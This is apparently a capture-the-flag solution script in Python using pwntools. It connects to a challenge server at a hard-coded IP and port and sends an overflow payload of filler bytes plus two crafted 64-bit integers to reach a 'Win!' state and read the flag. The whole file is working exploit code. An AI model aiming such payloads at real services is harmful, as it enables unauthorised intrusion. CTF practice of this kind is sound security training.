from pwn import *


def solve():
    io = remote('35.200.120.35', 9002)

    payload = b''
    payload += b'a' * 16
    payload += (9223372036854770110).to_bytes(8, byteorder='little')
    payload += (-9223372036854770000).to_bytes(8, byteorder='little', signed=True)

    for _ in range(3):
        io.sendline()
    io.sendlineafter(b'Input name:', payload)

    for _ in range(5):
        io.sendline()

    io.recvuntil(b'Win!\n')
    flag = io.recvline().decode()
    io.close()

    return flag


if __name__ == '__main__':
    print(solve())
